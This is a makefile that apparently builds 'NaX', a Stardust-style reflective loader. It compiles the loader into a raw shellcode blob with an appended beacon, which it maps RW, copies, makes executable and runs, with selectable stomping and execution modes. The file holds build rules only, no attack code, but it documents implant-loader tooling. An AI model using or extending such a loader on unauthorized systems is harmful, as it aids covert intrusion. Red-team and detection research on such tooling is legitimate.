# NaX src_loader/makefile - build Stardust-style UDRL → bin/nax_loader.x64.bin
#
# Source layout:
#   asm/x64/Stardust.asm     - Start / StRipStart / StRipEnd  (entry + end marker)
#   src/PreMain.c            - Stardust instance init, ntdll resolution, calls Main
#   src/Main.c               - NAX UDRL: finds beacon, allocs RW, copies, RX, calls
#   src/Ldr.c                - PEB-walk module + export resolver (LdrModulePeb / LdrFunction)
#   src/Utils.c              - HashString (djb2-style, used by Ldr / HASH_STR)
#   include/                 - Common.h, Macros.h, Defs.h, Constexpr.h, Native.h, ...
#
# Build pipeline:
#   NASM  →  bin/obj/asm_Stardust.x64.o
#   g++   →  bin/obj/nax_XXXX.x64.o   (compiled as C++ for constexpr / extern "C")
#   g++   →  bin/nax_loader.x64.exe   (linked with scripts/Linker.ld via -Wl,-T)
#   objcopy --dump-section .text → bin/nax_loader.x64.bin
#
# The final .bin is the raw shellcode blob: loader bytes followed immediately
# by the appended beacon (combine.sh handles the concatenation).
#
# Requirements:
#   x86_64-w64-mingw32-g++
#   nasm
#   objcopy  (binutils)

MAKEFLAGS += -s

##
## Toolchain
##
CC_X64   := x86_64-w64-mingw32-g++
NASM     := nasm
OBJCOPY   ?= $(shell which x86_64-w64-mingw32-objcopy 2>/dev/null || echo objcopy)

##
## Technique selection (overridable from parent Makefile)
##
NAX_STOMP_MODE ?= 1
NAX_EXEC_MODE  ?= 1

##
## Compiler / linker flags (Stardust original flags preserved)
##
CFLAGS   := -Os -fno-asynchronous-unwind-tables -nostdlib
CFLAGS   += -fno-ident -fpack-struct=8 -falign-functions=1
CFLAGS   += -s -ffunction-sections -falign-jumps=1 -w
CFLAGS   += -falign-labels=1 -fPIC
CFLAGS   += -Wl,-s,--no-seh,--enable-stdcall-fixup
CFLAGS   += -Iinclude -masm=intel -fpermissive
CFLAGS   += -mno-sse -fno-exceptions -fno-builtin
CFLAGS   += -MMD -MP
CFLAGS   += -DNAX_STOMP_MODE=$(NAX_STOMP_MODE)
CFLAGS   += -DNAX_EXEC_MODE=$(NAX_EXEC_MODE)

##
## Sources / objects
##
C_SRCS   := src/PreMain.c src/Main.c src/Pe.c src/Stomp.c src/Exec.c src/Ldr.c src/Utils.c
C_OBJS   := $(patsubst src/%.c, bin/obj/nax_%.x64.o, $(C_SRCS))

ASM_OBJ  := bin/obj/asm_Stardust.x64.o

EXE_X64  := bin/nax_loader.x64.exe
BIN_X64  := bin/nax_loader.x64.bin

##
## Targets
##
.PHONY: all clean

all: $(BIN_X64)

$(BIN_X64): $(EXE_X64)
	$(OBJCOPY) --dump-section .text=$(BIN_X64) $(EXE_X64) 2>/dev/null; true
	@touch $(BIN_X64)
	@echo "  BIN  $(BIN_X64)  ($$(wc -c < $(BIN_X64)) bytes)"

$(EXE_X64): $(ASM_OBJ) $(C_OBJS)
	@echo "[+] link NAX loader x64"
	$(CC_X64) $(ASM_OBJ) $(C_OBJS) -o $(EXE_X64) \
	    $(CFLAGS) -Wl,-Tscripts/Linker.ld 2>&1 || true

bin/obj/nax_%.x64.o: src/%.c | bin/obj
	@echo "[*] compile $<"
	$(CC_X64) -c $< -o $@ $(CFLAGS)

$(ASM_OBJ): asm/x64/Stardust.asm | bin/obj
	@echo "[*] assemble $<"
	$(NASM) -f win64 $< -o $@

bin/obj:
	mkdir -p bin/obj

# gcc auto-dependency files (-MMD -MP)
C_DEPS := $(C_OBJS:.o=.d)
-include $(C_DEPS)

clean:
	rm -rf bin/obj/*.o bin/obj/*.d bin/obj/*.obj bin/*.exe bin/*.bin
